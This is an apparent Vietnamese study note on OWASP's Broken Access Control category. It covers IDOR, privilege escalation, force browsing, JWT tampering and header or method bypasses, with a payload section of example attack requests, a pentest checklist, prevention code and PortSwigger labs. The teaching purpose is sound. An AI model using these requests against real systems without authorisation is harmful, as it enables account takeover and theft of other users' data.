# A01 – Broken Access Control

> **OWASP Top 10:2025 · #1** — 100% ứng dụng được kiểm tra có ít nhất một lỗi BAC. Đây là lỗ hổng phổ biến nhất vì cực khó detect tự động và dễ bị bỏ sót khi review code.

| Metric | Số liệu |
|---|---|
| CWE được map | 40 |
| CVEs liên quan | 32,654 |
| Tỉ lệ xuất hiện trung bình | 3.74% |

---

## 📖 Concept

Access control gồm **3 lớp** cần phân biệt rõ:

| Lớp | Câu hỏi | Ví dụ |
|---|---|---|
| **Authentication** | Bạn là ai? | Login bằng username/password |
| **Session management** | Request này có phải của bạn không? | Cookie, JWT token |
| **Access control** | Bạn có quyền làm điều này không? | Role, permission check |

**BAC xảy ra khi lớp thứ 3 bị bypass** — app biết bạn là ai nhưng không kiểm tra bạn được làm gì.

> ⚠️ Access control enforcement **phải xảy ra ở server-side**. Nếu chỉ kiểm tra ở client (JavaScript, hidden field, URL param), attacker bypass dễ dàng bằng Burp Suite hoặc `curl`.

---

## 🎯 Các dạng tấn công

### 1. IDOR (Insecure Direct Object Reference) — `Critical`

App dùng user-controlled input để truy xuất object trực tiếp mà **không verify ownership**.

**Dấu hiệu:** URL chứa numeric/predictable ID.

```
GET /api/orders/123   → 200 OK (đơn của bạn)
GET /api/orders/124   → 200 OK (đơn của người khác!) ← IDOR
```

> 💡 GUID không bảo vệ được nếu GUID bị leak trong response API khác (user reviews, messages, v.v.).

---

### 2. Vertical Privilege Escalation — `Critical`

User thường truy cập được chức năng **chỉ dành cho admin**.

```
# Force browse thẳng đến admin page
GET /admin/deleteUser  →  200 OK  (không check role!)

# Parameter tampering
GET /home?admin=true
Cookie: role=admin
```

---

### 3. Horizontal Privilege Escalation — `High`

Truy cập resource của **user cùng cấp quyền** nhưng khác account.

```
GET /myaccount?id=456
# Nếu id=456 là admin → horizontal chuyển thành vertical escalation
```

---

### 4. Force Browsing — `Medium`

Đoán/bruteforce URL để truy cập page **không có link trên UI**.

```
/admin
/dashboard/internal
/api/v1/admin/users
/administrator-panel-yb556   ← URL "bí mật" bị leak trong JS
```

> "Security by obscurity" ≠ access control thật.

**Nơi hay tìm thấy URL ẩn:**
- `robots.txt`
- `sitemap.xml`
- JavaScript source code (tìm `if (isAdmin) { href = '...' }`)

---

### 5. JWT / Metadata Tampering — `High`

Sửa token, cookie, hidden field để **nâng quyền**.

```json
// Decode JWT payload
{ "user": "alice", "role": "user" }

// Sửa thành
{ "user": "alice", "role": "admin" }
```

---

### 6. Platform Misconfiguration — `Medium`

Bypass rule bằng **non-standard header** hoặc đổi HTTP method.

```http
# Header override
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser

# Method bypass (rule chỉ block POST)
GET /admin/deleteUser?userId=5

# Trailing slash bypass (Spring useSuffixPatternMatch)
GET /admin/deleteUser/
GET /admin/deleteUser.json
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**CORS misconfiguration** — cho phép origin không tin cậy gọi API authenticated. Đặc biệt nguy hiểm khi kết hợp với XSS.

**Multi-step process bypass** — step 1 và 2 check quyền, nhưng step 3 (confirmation) không check. Attacker skip thẳng đến step 3.

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | URL chứa numeric ID: `/users/123`, `/orders/456` | Thử đổi sang ID khác |
| 🔴 High | Parameter chứa role: `?admin=false`, `?role=user` | Thử thay đổi giá trị |
| 🟡 Med | JWT/Cookie chứa `"role"`, `"isAdmin"`, `"permissions"` | Decode và sửa |
| 🟡 Med | Admin URL lộ trong HTML/JS source | Inspect source, check robots.txt |
| 🔵 Low | Response 302 redirect nhưng body vẫn có data | Burp bắt response trước khi redirect |
| 🔵 Low | API POST/PUT/DELETE thiếu auth check | Test trực tiếp bằng curl, bỏ qua UI |

---

## 🧠 Attack Flow – Methodology

### IDOR Testing

```
1. Identify endpoints có ID/parameter
   └─ Scan toàn bộ request trong Burp, tìm numeric/predictable ID

2. Tạo 2 account (A và B)
   └─ Account A tạo resource → ghi lại ID
   └─ Account B request ID đó

3. Thay đổi ID trong Burp Repeater
   └─ Test thủ công
   └─ Dùng Intruder để enumerate range
   └─ Dùng Autorize để automate cross-account

4. Observe response
   └─ 200 + data      → IDOR confirmed
   └─ 403 Forbidden   → có check
   └─ 200 + empty     → có thể vẫn là bug (enumeration)

5. Escalate: test write operations
   └─ PUT/DELETE/POST với ID của người khác
   └─ Impact cao hơn nhiều so với chỉ read
```

### Privilege Escalation Testing

```
1. Map chức năng admin (cần có account admin)
   └─ Burp capture tất cả request khi dùng admin account

2. Force browse các admin URL bằng user session
   └─ Autorize: load admin sitemap, replay với user token

3. Test parameter/cookie manipulation
   └─ Tìm và sửa role-related value
   └─ Test cả unauthenticated (bỏ cookie hoàn toàn)
```

---

## 💣 Payloads

### IDOR

```http
# Horizontal IDOR – đổi ID
GET /api/users/1337/profile HTTP/1.1
Authorization: Bearer <your_token>

# IDOR qua body parameter
POST /api/transfer HTTP/1.1
{
  "from_account": 99999,
  "to_account": "attacker",
  "amount": 1000
}
```

### Privilege Escalation

```http
# Force browse
GET /admin HTTP/1.1
GET /admin/users HTTP/1.1
GET /management/console HTTP/1.1

# Parameter tampering
GET /home?admin=true HTTP/1.1
GET /login?role=administrator HTTP/1.1

# Cookie manipulation
Cookie: session=abc123; role=admin
```

### Bypass Tricks

```http
# Header override
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
X-Rewrite-URL: /admin/deleteUser

# HTTP method change
GET /admin/deleteUser?userId=5 HTTP/1.1

# URL case variation
GET /ADMIN/deleteUser HTTP/1.1

# Trailing slash (Spring useSuffixPatternMatch)
GET /admin/deleteUser/ HTTP/1.1
GET /admin/deleteUser.json HTTP/1.1

# Referer spoofing
GET /admin/settings HTTP/1.1
Referer: https://target.com/admin
```

### JWT

```bash
# Decode JWT (không cần tool)
echo "eyJ..." | base64 -d

# Payload thường gặp – tìm và sửa
{
  "sub": "user123",
  "role": "user",       ← thử sửa thành "admin"
  "iat": 1700000000,
  "exp": 1700086400
}

# alg:none attack – bỏ signature, server không verify
Header: { "alg": "none", "typ": "JWT" }
```

---

## 🛡️ Prevention

### Nguyên tắc cốt lõi: Deny by default

> Thay vì liệt kê những gì *bị cấm*, chỉ cho phép những gì **được phép rõ ràng**. Mọi resource mặc định không ai được truy cập, trừ khi có rule cụ thể grant quyền.

### Checklist cho developer

- [ ] Check quyền ở **server-side** — không trust input từ client
- [ ] Verify **ownership** với mỗi resource (`order.userId == currentUser.id`)
- [ ] Implement **RBAC** tập trung một lần, reuse toàn app
- [ ] **Rate limit** API để ngăn automated enumeration
- [ ] JWT **short-lived** (15–60 phút), invalidate sau logout
- [ ] **Log** access control failures, alert khi repeated failures

### Bad vs Good

```python
# ❌ Frontend-only check
if (user.role === 'admin') {
    showAdminButton()
}
# API không check gì cả → bypass bằng curl

# ✅ Server-side check
def delete_user(user_id):
    if not is_authorized(current_user, 'admin'):
        return 403
    # proceed...
```

```python
# ❌ Không check ownership
def get_order(order_id):
    return db.get(order_id)   # trả về luôn

# ✅ Verify ownership
def get_order(order_id):
    order = db.get(order_id)
    if order.user_id != current_user.id:
        return 403
    return order
```

---

## 🧪 Labs – PortSwigger Web Security Academy

Nên làm theo thứ tự từ Apprentice → Practitioner.

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality) | 🟡 Apprentice | Force browsing, robots.txt leak |
| [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter) | 🟡 Apprentice | IDOR, horizontal escalation |
| [URL-based access control circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented) | 🔴 Practitioner | X-Original-URL header bypass |
| [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step) | 🔴 Practitioner | Skip step, attack step 3 |
| [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control) | 🔴 Practitioner | Forge Referer header |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **Burp Suite – Repeater** | Test thủ công, thay đổi parameter, observe response |
| **Autorize** (Burp extension) | Tự động replay request với session user khác. Detect BAC cực nhanh |
| **Burp Intruder** | Enumerate ID (1 → 9999) để tìm IDOR |
| **JWT Editor** (Burp extension) | Decode, sửa, resign JWT. Test alg:none |
| **ffuf** | Bruteforce hidden endpoint với wordlist SecLists |

---

## 🌍 Real-world Cases

**Case 1 – IDOR lộ đơn hàng (E-commerce)**

App để `order_id` là số tăng dần trong URL `/orders/10234`. Attacker thay đổi ID tuần tự → xem được tên, địa chỉ, sản phẩm của toàn bộ khách hàng. Root cause: `GET /orders/{id}` không kiểm tra order có thuộc về user đang login không.

**Case 2 – Admin panel không có auth check**

Ứng dụng nội bộ có `/admin/console` được "bảo vệ" bằng JavaScript (ẩn button). Attacker dùng `curl https://target.com/admin/console` → response đầy đủ admin panel vì server không check session.

**Case 3 – Horizontal → Vertical escalation qua password reset**

Trang `/myaccount?id=456` của admin hiển thị form đổi password. Attacker đổi `id` sang ID admin → thấy form → submit password mới → login admin account → vertical privilege escalation thành công.

---

## 💡 Attacker Mindset

> **"Mỗi khi thấy ID trong request:** server có verify object này thuộc về mình không?"

Không phải đổi ID là luôn ra IDOR — nhưng luôn phải thử. Ngay cả GUID cũng có thể bị leak từ endpoint khác.

> **"Mỗi khi thấy role/admin trong request:** ai control giá trị này?"

Nếu giá trị đến từ client (cookie, URL param, JWT payload không verify) → đó là attack surface. Server phải tự lấy role từ DB, không được tin client-sent role.

> **"Frontend không hiển thị button/link không có nghĩa endpoint được bảo vệ."**

curl và Burp không bị ảnh hưởng bởi JavaScript UI logic. Luôn test API endpoint trực tiếp.

---

## ✅ Quick Pentest Checklist

- [ ] Đổi numeric ID trong URL/body
- [ ] Test endpoint với user khác (Autorize)
- [ ] Tìm role/admin trong URL, cookie, JWT
- [ ] Force browse `/admin`, `/dashboard/admin`
- [ ] Check `robots.txt`, `sitemap.xml`, JS source
- [ ] Test `X-Original-URL` header bypass
- [ ] Đổi HTTP method (POST → GET)
- [ ] Test unauthenticated (xóa token hoàn toàn)

---

*Nguồn: [OWASP Top 10:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) · [PortSwigger Web Security Academy](https://portswigger.net/web-security/access-control)*
